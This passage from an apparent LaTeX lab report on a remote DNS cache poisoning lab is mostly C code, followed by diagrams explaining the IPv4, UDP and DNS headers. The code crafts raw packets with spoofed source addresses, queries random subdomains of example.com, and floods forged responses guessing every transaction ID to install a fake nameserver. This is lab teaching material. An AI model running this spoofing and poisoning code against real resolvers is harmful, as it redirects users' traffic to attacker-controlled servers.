    ip->iph_sourceip = inet_addr("199.43.135.53");

    // The destination IP address

    ip->iph_destip = inet_addr(src_addr);

    // Fabricate the UDP header. Source port number is redundant

    udp->udph_srcport = htons(53);  // Random source port number, lower numbers may be reserved

    // Destination port number

    udp->udph_destport = htons(33333);

    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+anslength+sizeof( struct ansEnd)+nslength+sizeof(struct nsEnd)+addrlen+nsnamelen+arlength+sizeof(struct ansEnd)+araddrlen); // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));

    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));


    // Prevent kernel from filling up DNS packet with its information
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");
        exit(-1);
    }

    int count = 0;
    int trans_id = 3000;
    while(count < 100)
    {


// This is to generate queries for random sub-domains xxxxx.example.com
        dns->query_id=trans_id+count;
        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
// Recalculate the checksum for the UDP packet

        // Send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));
        count++;
    }
    close(sd);

    return 0;
}

int main(int argc, char *argv[])
{

// This is to check the argc number
    if(argc != 3)
    {
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }


// socket descriptor
    int sd;

// buffer to hold the packet
    char buffer[PCKT_LEN];

// set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures

    struct ipheader *ip = (struct ipheader *) buffer;

    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));

    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

// data is the pointer points to the first byte of the dns payload
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));


////////////////////////////////////////////////////////////////////////
// dns fields(UDP payload field)
// relate to the lab, you can change them. begin:
////////////////////////////////////////////////////////////////////////

//The flag you need to set

    dns->flags=htons(FLAG_Q);
//only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);


//query string
    strcpy(data,"\5abcde\7example\3com");
    int length= strlen(data)+1;


// This is more convenient to write the 4bytes in a more organised way.

    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);


/////////////////////////////////////////////////////////////////////
//
// DNS format, relate to the lab, you need to change them, end
//
//////////////////////////////////////////////////////////////////////


    /*************************************************************************************
    Construction of the packet is done.
    now focus on how to do the settings and send the packet we have composed out
    ***************************************************************************************/
    // Source and destination addresses: IP and port

    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random

    // Create a raw socket with UDP protocol

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);


    if(sd<0 ) // if socket fails to be created
        printf("socket error\n");

    // The source is redundant, may be used later if needed

    // The address family

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers

    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses

    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.

    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size

    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // we give a random number for the identification
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // Source IP address, spoofed address is used here!!!

    ip->iph_sourceip = inet_addr(argv[1]);

    // The destination IP address

    ip->iph_destip = inet_addr(argv[2]);


    // Fabricate the UDP header. Source port number, redundant

    udp->udph_srcport = htons(33333);  // Random source port number, lower numbers may be reserved

    // Destination port number

    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

    // Calculate the checksum for integrity//

    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));


    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    /*******************************************************************************
    Tips
    The checksum is quite important to pass the checking integrity. You need to study the algorithm and what part should be taken into the calculation.
    !!!!!If you change anything related to the calculation of the checksum, you need to re-calculate it or the packet will be dropped.!!!!!
    Here things became easier since I wrote the checksum function for you. You don't need to spend your time writing the right checksum function.
    Just for knowledge purpose, remember the second parameter
    for UDP checksum:
    ipheader_size + udpheader_size + udpData_size
    for IP checksum:
    ipheader_size + udpheader_size
    *********************************************************************************/

    // Prevent kernel from filling up DNS packet with its information
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");
        exit(-1);
    }

    while(1)
    {
// This is to generate queries for random sub-domains xxxxx.example.com
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));
        sleep(0.9);
        response(data, argv[2], argv[1]);
    }
    close(sd);

    return 0;
}
		\end{minted}
		\iffalse
		%Alternative code
		// ----udp.c------
		// This sample program must be run by root lol! 
		// 
		// The program is to spoofing tons of different queries to the victim.
		// Use wireshark to study the packets. However, it is not enough for 
		// the lab, please finish the response packet and complete the task.
		//
		// Compile command:
		// gcc -lpcap udp.c -o udp
		//
		// 
		
		    #include <unistd.h>
		
		    #include <stdio.h>
		
		    #include <sys/socket.h>
		
		    #include <netinet/ip.h>
		
		    #include <netinet/udp.h>
		    #include <fcntl.h>
		    #include <string.h>
		    #include <errno.h>
		    #include <stdlib.h>
		#include <libnet.h>
		    // The packet length
		
		    #define PCKT_LEN 8192
		    #define FLAG_R 0x8400
		    #define FLAG_Q 0x0100
		     
		
		
		    // Can create separate header file (.h) for all headers' structure
		
		    // The IP header's structure
		
		    struct ipheader {
		
		     unsigned char      iph_ihl:4, iph_ver:4;
		
		     unsigned char      iph_tos;
		
		     unsigned short int iph_len;
		
		     unsigned short int iph_ident;
		
		 //    unsigned char      iph_flag;
		
		     unsigned short int iph_offset;
		
		     unsigned char      iph_ttl;
		
		     unsigned char      iph_protocol;
		
		     unsigned short int iph_chksum;
		
		     unsigned int       iph_sourceip;
		
		     unsigned int       iph_destip;
		
		    };
		
		     
		
		    // UDP header's structure
		
		    struct udpheader {
		
		     unsigned short int udph_srcport;
		
		     unsigned short int udph_destport;
		
		     unsigned short int udph_len;
		
		     unsigned short int udph_chksum;
		
		    };
		    struct dnsheader {
			unsigned short int query_id;
			unsigned short int flags;
			unsigned short int QDCOUNT;
			unsigned short int ANCOUNT;
			unsigned short int NSCOUNT;
			unsigned short int ARCOUNT;
		};
		// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
		    struct dataEnd{
			unsigned short int  type;
			unsigned short int  class;
		};
		    struct datalen{
		    unsigned short int ttl1,ttl2;
		    unsigned short int len;
		};
		    struct root{
		    unsigned short int  type;
		    unsigned short int v1,v2,v3;
		  
		};
		    // total udp header length: 8 bytes (=64 bits)
		
		
		
		
		unsigned int checksum(uint16_t *usBuff, int isize)
		{
			unsigned int cksum=0;
			for(;isize>1;isize-=2){
			cksum+=*usBuff++;
		       }
			if(isize==1){
			 cksum+=*(uint16_t *)usBuff;
		        }
		
		
			return (cksum);
		}
		
		// calculate udp checksum
		uint16_t check_udp_sum(uint8_t *buffer, int len)
		{
		        unsigned long sum=0;
			struct ipheader *tempI=(struct ipheader *)(buffer);
			struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
			struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
			tempH->udph_chksum=0;
			sum=checksum( (uint16_t *)   &(tempI->iph_sourceip) ,8 );
			sum+=checksum((uint16_t *) tempH,len);
		
			sum+=ntohs(IPPROTO_UDP+len);
			
		
			sum=(sum>>16)+(sum & 0x0000ffff);
			sum+=(sum>>16);
		
			return (uint16_t)(~sum);
			
		}
		    // Function for checksum calculation. From the RFC,
		
		    // the checksum algorithm is:
		
		    //  "The checksum field is the 16 bit one's complement of the one's
		
		    //  complement sum of all 16 bit words in the header.  For purposes of
		
		    //  computing the checksum, the value of the checksum field is zero."
		
		    unsigned short csum(unsigned short *buf, int nwords)
		
		    {       //
		
		            unsigned long sum;
		
		            for(sum=0; nwords>0; nwords--)
		
		                    sum += *buf++;
		
		            sum = (sum >> 16) + (sum &0xffff);
		
		            sum += (sum >> 16);
		
		            return (unsigned short)(~sum);
		
		    }
		
		
		
		
		
		
		
		
		
		
		    
		
		int main(int argc, char *argv[])
		{
		
		
		
		// This is to check the argc number
		    if(argc != 3){
		
		    	printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
		   
		    	exit(-1);
		
		    }
		
		
		// socket descriptor
		    int sd;
		
		// buffer to hold the packet
		    char buffer[PCKT_LEN];
		    char send_buf[PCKT_LEN];
		
		// set the buffer to 0 for all bytes
		    memset(buffer, 0, PCKT_LEN);
		    memset(send_buf, 0, PCKT_LEN);
		
		    // Our own headers' structures
		
		    struct ipheader *ip = (struct ipheader *) buffer;
		    struct ipheader *ip2 = (struct ipheader *) send_buf;
		
		    struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
		    struct udpheader *udp2 = (struct udpheader *) (send_buf + sizeof(struct ipheader));
		
		    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
		    struct dnsheader *dns2=(struct dnsheader*) (send_buf +sizeof(struct ipheader)+sizeof(struct udpheader));
		// data is the pointer points to the first byte of the dns payload  
		    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
		    char *data_send=(send_buf +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
		
		
		
		
		////////////////////////////////////////////////////////////////////////
		// This is for SEND DNS REQUSET
		// dns fields(UDP payload field)
		// relate to the lab, you can change them. begin:
		////////////////////////////////////////////////////////////////////////
		
		//The flag you need to set
		/* I set it flag is Q */
		    dns2->flags=htons(FLAG_Q);
		//only 1 query, so the count should be one.
		    dns2->QDCOUNT=htons(1);
		
		
		
		
		
		
		//query string
		    strcpy(data_send,"\5aaaaa\7example\3com");
		    int length_send= strlen(data_send)+1;
		
		// this is for convinience to get the struct type write the 4bytes in a more organized way.
		    struct dataEnd * end_send=(struct dataEnd *)(data_send+length_send);
		    end_send->type=htons(1);
		    end_send->class=htons(1);
		   
		    
		
		    
		
		
		
		
		
		/////////////////////////////////////////////////////////////////////
		//
		// DNS format, relate to the lab, you need to change them, end
		//
		//////////////////////////////////////////////////////////////////////
		
		
		
		
		////////////////////////////////////////////////////////////////////////
		// This is for FAKE RESPONSE DNS    
		// dns fields(UDP payload field)
		// relate to the lab, you can change them. begin:
		////////////////////////////////////////////////////////////////////////
		
		//The flag you need to set
		/* I set it flag is R */
			dns->flags=htons(FLAG_R);
		//only 1 query, so the count should be one.
			dns->QDCOUNT=htons(1);
		    dns->ANCOUNT=htons(1);
		    dns->NSCOUNT=htons(1);
		    dns->ARCOUNT=htons(2);
		
		
		
		
		
		
		//query string
		    strcpy(data,"\5aaaaa\7example\3com");
		    int length= strlen(data)+1;
		
		//answer string
		
		// this is for convinience to get the struct type write the 4bytes in a more organized way.
		    struct dataEnd * end=(struct dataEnd *)(data+length);
		    end->type=htons(1);
		    end->class=htons(1);
		    length+=4;
		    strcpy(data+length,"\xc0\x0c");
		    //type + class
		    length+=2;
		    struct dataEnd * end1=(struct dataEnd *)(data+length);
		    end1->type=htons(1);
		    end1->class=htons(1);
		    length+=4;
		    //datalen + ttl
		   
		    struct datalen * len1=(struct datalen *)(data+length);
		    len1->ttl1=htons(1);
		    len1->ttl2=htons(1);
		    len1->len=htons(4);
		    length+=6;
		    //address
		    strcpy(data+length,"\1\1\1\1");
		    length+=4;
		    //Authority querry
		    strcpy(data+length,"\xc0\x12");
		    length+=2;
		    //type + class
		    struct dataEnd * end2=(struct dataEnd *)(data+length);
		    end2->type=htons(2);
		    end2->class=htons(1);
		    length+=4;
		    //datalen + ttl
		    
		    struct datalen * len2=(struct datalen *)(data+length);
		    len2->ttl1=htons(1);
		    len2->ttl2=htons(1);
		    len2->len=htons(23);
		    length+=6;
		    //fake name server
		    // ns.dnslabattacker.net
		    strcpy(data+length,"\2ns\16dnslabattacker\3net");
		    length+=23;
		    //addition 
		    strcpy(data+length,"\2ns\16dnslabattacker\3net");
		    length+=23;
		    struct dataEnd * end3=(struct dataEnd *)(data+length);
		    end3->type=htons(1);
		    end3->class=htons(1);
		    length+=4;
		    struct datalen * len3=(struct datalen *)(data+length);
		    len3->ttl1=htons(1);
		    len3->ttl2=htons(1);
		    len3->len=htons(4);
		    length+=6;
		    strcpy(data+length,"\1\1\1\1");
		    //Root
		    length+=5;
		    struct dataEnd * end4=(struct dataEnd *)(data+length);
		    end4->type=htons(41);
		    end4->class=htons(4096);
		    length+=6;
		    struct dataEnd * end5=(struct dataEnd *)(data+length);
		    end5->type=htons(34816);
		    end5->class=htons(0);
		    
		
		    
		
		
		
		
		
		/////////////////////////////////////////////////////////////////////
		//
		// DNS format, relate to the lab, you need to change them, end
		//
		//////////////////////////////////////////////////////////////////////
		
		
		
		
		
		
		
		
		
		
		/*************************************************************************************
		Construction of the packet is done. 
		now focus on how to do the settings and send the packet we have composed out
		***************************************************************************************/
		    // Source and destination addresses: IP and port
		
		    struct sockaddr_in sin, din;
		
		    int one = 1;
		
		    const int *val = &one;
		
		    srand(time(NULL));
		    dns->query_id=rand(); // transaction ID for the query packet, use random #
		    dns2->query_id=rand();
		
		     
		
		    // Create a raw socket with UDP protocol
		
		    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
		
		
		if(sd<0 ) // if socket fails to be created 
		printf("socket error\n");
		
		
		    // The source is redundant, may be used later if needed
		
		    // The address family
		
		    sin.sin_family = AF_INET;
		
		    din.sin_family = AF_INET;
		
		    // Port numbers
		
		    sin.sin_port = htons(33333);
		
		    din.sin_port = htons(53);
		
		    // IP addresses
		
		    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
		
		    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
		
		     
		
		    // Fabricate the IP header or we can use the
		
		    // standard header structures but assign our own values.
		
		    ip->iph_ihl = 5;
		
		
		    ip->iph_ver = 4;
		
		
		    ip->iph_tos = 0; // Low delay
		
		
		    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
		
		     ip->iph_len=htons(packetLength);
		
		    ip->iph_ident = htons(rand()); // we give a random number for the identification#
		
		
		    ip->iph_ttl = 110; // hops
		
		    ip->iph_protocol = 17; // UDP
		
		    // Source IP address, can use spoofed address here!!!
		
		    ip->iph_sourceip = inet_addr("199.43.135.53");
		
		    // The destination IP address
		
		    ip->iph_destip = inet_addr(argv[2]);
		
		     
		
		    // Fabricate the UDP header. Source port number, redundant
		
		    udp->udph_srcport = htons(53);//40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
		
		    // Destination port number
		
		    udp->udph_destport = htons(33333);
		
		
		    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
		
		
		
		
		
		
		
		
		    // Calculate the checksum for integrity//
		
		    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
		 
		
		    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
		/*******************************************************************************8
		*/
		
		
		
		
		
		    // This is configue for send packet
		
		    // standard header structures but assign our own values.
		
		    ip2->iph_ihl = 5;
		
		
		    ip2->iph_ver = 4;
		
		
		    ip2->iph_tos = 0; // Low delay
		
		
		    unsigned short int packetLength_send =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length_send+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
		
		     ip2->iph_len=htons(packetLength_send);
		
		    ip2->iph_ident = htons(rand()); // we give a random number for the identification#
		
		
		    ip2->iph_ttl = 110; // hops
		
		    ip2->iph_protocol = 17; // UDP
		
		    // Source IP address, can use spoofed address here!!!
		
		    ip2->iph_sourceip = inet_addr(argv[1]);
		
		    // The destination IP address
		
		    ip2->iph_destip = inet_addr(argv[2]);
		
		     
		
		    // Fabricate the UDP header. Source port number, redundant
		
		    udp2->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
		
		    // Destination port number
		
		    udp2->udph_destport = htons(53);
		
		
		    udp2->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length_send+sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
		
		
		
		
		
		
		
		
		    // Calculate the checksum for integrity//
		
		    ip2->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
		 
		
		    udp2->udph_chksum=check_udp_sum(buffer, packetLength_send-sizeof(struct ipheader));
		/*******************************************************************************8
		Tips
		
		the checksum is quite important to pass the checking integrity. You need 
		to study the algorithem and what part should be taken into the calculation.
		
		!!!!!If you change anything related to the calculation of the checksum, you need to re-
		calculate it or the packet will be dropped.!!!!!
		
		Here things became easier since I wrote the checksum function for you. You don't need
		to spend your time writing the right checksum function.
		Just for knowledge purpose,
		remember the seconed parameter
		for UDP checksum:
		ipheader_size + udpheader_size + udpData_size  
		for IP checksum: 
		ipheader_size + udpheader_size
		*********************************************************************************/
		
		
		
		
		
		
		
		
		
		
		
		    // Inform the kernel do not fill up the packet structure. we will build our own...
		 if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
		{
			printf("error\n");	
			exit(-1);
		}
		
		
		
		// int ci=10;
		
		while(1){    	
		
		
		// This is to generate different query in xxxxx.example.com
		    
		
			int charnumber;
			charnumber=1+rand()%5;
		    *(data_send+charnumber)+=1;
			*(data+charnumber)+=1;
		
		    //send request:
		    udp2->udph_chksum=check_udp_sum(send_buf, packetLength_send-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
		
		        // send the packet out.
		        if(sendto(sd, send_buf, packetLength_send, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		        printf("packet send error %d which means %s\n",errno,strerror(errno));
		    //Send fake response
		    unsigned short int co=65535;
		    while(co--){
		        dns->query_id=co; // transaction ID for the query packet, use random #
		        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
		
		    // send the packet out.
		        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		        printf("packet send error %d which means %s\n",errno,strerror(errno));
		    }
			
		}
		close(sd);
		
		return 0;
		
		}
		\fi
		\restoregeometry
		\subsection{Explanation (For Selected Parts)}
		Lines 33 -- 49 creates the structure required for the IPv4 header, which is illustrated in the figure below\footnote[1]{\url{https://nmap.org/book/tcpip-ref.html}\label{foot1}}.
		\begin{figure}[H]
			\centering
			\tikzset{>=stealth'}
			\begin{tikzpicture}
			
			\draw (-0.8,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=left] {Bit\\Offset};
			\draw[line width=0.5mm,fill=black] (-0.02,0.6) -- (-0.02,-10.6);
			\draw (0,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 0};
			\draw[line width=0.5mm] (3.2,0.6) -- (3.2,-10.6);
			\draw (3.2,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 7};
			\draw[line width=0.5mm] (6.4,0.6) -- (6.4,-10.6);
			\draw (6.4,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 15};
			\draw[line width=0.5mm] (9.6,0.6) -- (9.6,-10.6);
			\draw (9.6,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 23};
			\draw[line width=0.5mm] (12.82,0.6) -- (12.82,-10.6);
			\draw (12.8,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 31};
			
			\draw[line width=0.2mm](0.4,0.2) -- (0.4,-10.2);
			\draw[line width=0.2mm](0.8,0.2) -- (0.8,-10.2);
			\draw[line width=0.2mm](1.2,0.2) -- (1.2,-10.2);
			\draw[line width=0.4mm](1.6,0.35) -- (1.6,-10.35);
			\draw[line width=0.2mm](2,0.2) -- (2,-10.2);
			\draw[line width=0.2mm](2.4,0.2) -- (2.4,-10.2);
			\draw[line width=0.2mm](2.8,0.2) -- (2.8,-10.2);
			
			\draw[line width=0.2mm](3.6,0.2) -- (3.6,-10.2);
			\draw[line width=0.2mm](4,0.2) -- (4,-10.2);
			\draw[line width=0.2mm](4.4,0.2) -- (4.4,-10.2);
			\draw[line width=0.4mm](4.8,0.35) -- (4.8,-10.35);
			\draw[line width=0.2mm](5.2,0.2) -- (5.2,-10.2);
			\draw[line width=0.2mm](5.6,0.2) -- (5.6,-10.2);
			\draw[line width=0.2mm](6,0.2) -- (6,-10.2);
			
			\draw[line width=0.2mm](6.8,0.2) -- (6.8,-10.2);
			\draw[line width=0.2mm](7.2,0.2) -- (7.2,-10.2);
			\draw[line width=0.2mm](7.6,0.2) -- (7.6,-10.2);
			\draw[line width=0.4mm](8,0.35) -- (8,-10.35);
			\draw[line width=0.2mm](8.4,0.2) -- (8.4,-10.2);
			\draw[line width=0.2mm](8.8,0.2) -- (8.8,-10.2);
			\draw[line width=0.2mm](9.2,0.2) -- (9.2,-10.2);
			
			\draw[line width=0.2mm](10,0.2) -- (10,-10.2);
			\draw[line width=0.2mm](10.4,0.2) -- (10.4,-10.2);
			\draw[line width=0.2mm](10.8,0.2) -- (10.8,-10.2);
			\draw[line width=0.4mm](11.2,0.35) -- (11.2,-10.35);
			\draw[line width=0.2mm](11.6,0.2) -- (11.6,-10.2);
			\draw[line width=0.2mm](12,0.2) -- (12,-10.2);
			\draw[line width=0.2mm](12.4,0.2) -- (12.4,-10.2);
			
			\draw[line width=0.5mm] (0,-1.7) -- (-0.5,-1.7);
			\draw (-0.5,-1.7) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 32};
			\draw[line width=0.5mm] (0,-3.4) -- (-0.5,-3.4);
			\draw (-0.5,-3.4) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 64};
			\draw[line width=0.5mm] (0,-5.1) -- (-0.5,-5.1);
			\draw (-0.5,-5.1) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 96};
			\draw[line width=0.5mm] (0,-6.8) -- (-0.5,-6.8);
			\draw (-0.5,-6.8) node[xshift=-0.2cm, yshift=-0.3cm]{\color{red} 128};
			\draw[line width=0.5mm] (0,-8.5) -- (-0.5,-8.5);
			\draw (-0.5,-8.5) node[xshift=-0.2cm, yshift=-0.3cm]{\color{red} 160};
			
			%First Row
			\draw[fill=white!50] (0,0) rectangle node{\footnotesize Version} (1.59,-1.5);
			\draw[fill=white!50] (1.61,0) rectangle node[align=center, text width=1.57cm]{\footnotesize Header\\Length (IHL)} (3.18,-1.5);
			\draw[fill=white!50] (3.22,0) rectangle node[align=center,text width=3.16cm]{\footnotesize Type of\\Service (TOS)} (6.38,-1.5);
			\draw[fill=white!50] (6.42,0) rectangle node{\footnotesize Total Length} (12.8,-1.5);
			
			%Second Row
			\draw[fill=white!50] (0,-1.7) rectangle node{\footnotesize Identification} (6.38,-3.2);
			\draw[fill=white!50] (6.42,-1.7) rectangle node[align=center,text width=1.16cm]{\footnotesize IP\\ Flags} (7.6,-3.2);
			\draw[fill=white!50] (7.6,-1.7) rectangle node{\footnotesize Fragment Offset} (12.8,-3.2);
			
			%Third Row
			\draw[fill=white!50] (0,-3.4) rectangle node[align=center,text width=3.18cm]{\footnotesize Time To\\ Live (TTL)} (3.18,-4.9);
			\draw[fill=white!50] (3.22,-3.4) rectangle node{\footnotesize Protocol} (6.38,-4.9);
			\draw[fill=white!50] (6.42,-3.4) rectangle node{\footnotesize Header Checksum} (12.8,-4.9);
			
			%Fourth Row
			\draw[fill=white!50] (0,-5.1) rectangle node{\footnotesize Source Address} (12.8,-6.6);
			
			%Fifth Row
			\draw[fill=white!50] (0,-6.8) rectangle node{\footnotesize Destination Address}(12.8,-8.3);
			
			%Sixth Row
			\draw[fill=white!50] (0,-8.5) rectangle node{\footnotesize IP Option (variable length, optional)}(12.8,-10);

			\end{tikzpicture}
			\caption{IPv4 Header}
				\label{fig:IPv4Head}
			\end{figure}
			\noindent Extensive information on the IPv4 header and its field definitions can be found on AIT's WordPress site\footnote[2]{\url{https://advancedinternettechnologies.wordpress.com/ipv4-header/}}.\\\\
			Lines 53 -- 59 creates the structure for the UDP packet header, which is illustrated in the figure below\footref{foot1}. 
			\begin{figure}[H]
						\centering
						\tikzset{>=stealth'}
						\begin{tikzpicture}
						
						\draw (-0.8,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=left] {Bit\\Offset};
						\draw[line width=0.5mm,fill=black] (-0.02,0.6) -- (-0.02,-3.8);
						\draw (0,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 0};
						\draw[line width=0.5mm] (3.2,0.6) -- (3.2,-3.8);
						\draw (3.2,0) node[xshift=0.2cm, yshift=0.6cm]{\color{red} 7};
						\draw[line width=0.5mm] (6.4,0.6) -- (6.4,-3.8);
						\draw (6.4,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 15};
						\draw[line width=0.5mm] (9.6,0.6) -- (9.6,-3.8);
						\draw (9.6,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 23};
						\draw[line width=0.5mm] (12.82,0.6) -- (12.82,-3.8);
						\draw (12.8,0) node[xshift=0.3cm, yshift=0.6cm]{\color{red} 31};
						
						\draw[line width=0.2mm](0.4,0.2) -- (0.4,-3.4);
						\draw[line width=0.2mm](0.8,0.2) -- (0.8,-3.4);
						\draw[line width=0.2mm](1.2,0.2) -- (1.2,-3.4);
						\draw[line width=0.4mm](1.6,0.35) -- (1.6,-3.55);
						\draw[line width=0.2mm](2,0.2) -- (2,-3.4);
						\draw[line width=0.2mm](2.4,0.2) -- (2.4,-3.4);
						\draw[line width=0.2mm](2.8,0.2) -- (2.8,-3.4);
						
						\draw[line width=0.2mm](3.6,0.2) -- (3.6,-3.4);
						\draw[line width=0.2mm](4,0.2) -- (4,-3.4);
						\draw[line width=0.2mm](4.4,0.2) -- (4.4,-3.4);
						\draw[line width=0.4mm](4.8,0.35) -- (4.8,-3.55);
						\draw[line width=0.2mm](5.2,0.2) -- (5.2,-3.4);
						\draw[line width=0.2mm](5.6,0.2) -- (5.6,-3.4);
						\draw[line width=0.2mm](6,0.2) -- (6,-3.4);
						
						\draw[line width=0.2mm](6.8,0.2) -- (6.8,-3.4);
						\draw[line width=0.2mm](7.2,0.2) -- (7.2,-3.4);
						\draw[line width=0.2mm](7.6,0.2) -- (7.6,-3.4);
						\draw[line width=0.4mm](8,0.35) -- (8,-3.55);
						\draw[line width=0.2mm](8.4,0.2) -- (8.4,-3.4);
						\draw[line width=0.2mm](8.8,0.2) -- (8.8,-3.4);
						\draw[line width=0.2mm](9.2,0.2) -- (9.2,-3.4);
						
						\draw[line width=0.2mm](10,0.2) -- (10,-3.4);
						\draw[line width=0.2mm](10.4,0.2) -- (10.4,-3.4);
						\draw[line width=0.2mm](10.8,0.2) -- (10.8,-3.4);
						\draw[line width=0.4mm](11.2,0.35) -- (11.2,-3.55);
						\draw[line width=0.2mm](11.6,0.2) -- (11.6,-3.4);
						\draw[line width=0.2mm](12,0.2) -- (12,-3.4);
						\draw[line width=0.2mm](12.4,0.2) -- (12.4,-3.4);
						
						\draw[line width=0.5mm] (0,-1.7) -- (-0.5,-1.7);
						\draw (-0.5,-1.7) node[xshift=-0.1cm, yshift=-0.3cm]{\color{red} 32};
						
						%First Row
						\draw[fill=white!50] (0,0) rectangle node{\footnotesize Source Port} (6.38,-1.5);
						\draw[fill=white!50] (6.42,0) rectangle node{\footnotesize Destination Port} (12.8,-1.5);
						
						%Second Row
						\draw[fill=white!50] (0,-1.7) rectangle node{\footnotesize UDP Length} (6.38,-3.2);
						\draw[fill=white!50] (6.42,-1.7) rectangle node{\footnotesize UDP Checksum} (12.8,-3.2);
			
						\end{tikzpicture}
						\caption{UDP Packet Header}
							\label{fig:UDPHead}
						\end{figure}
					\noindent Lines 60 -- 68 creates the structure for the DNS header, which is illustrated in the figure below\footnote[3]{\url{https://www.securityartwork.es/2013/02/21/snort-byte_test-for-dummies-2/}} \footnote[4]{\url{https://tools.ietf.org/html/rfc1035\#page-26}\label{IETF}}.	
					\begin{figure}[H]
		\centering
		\tikzset{>=stealth'}
		\begin{tikzpicture}
		
		\draw (-0.8,0) node[xshift=0cm,yshift=0.3cm,text width=0.7cm, align=left] {Bit\\Offset};
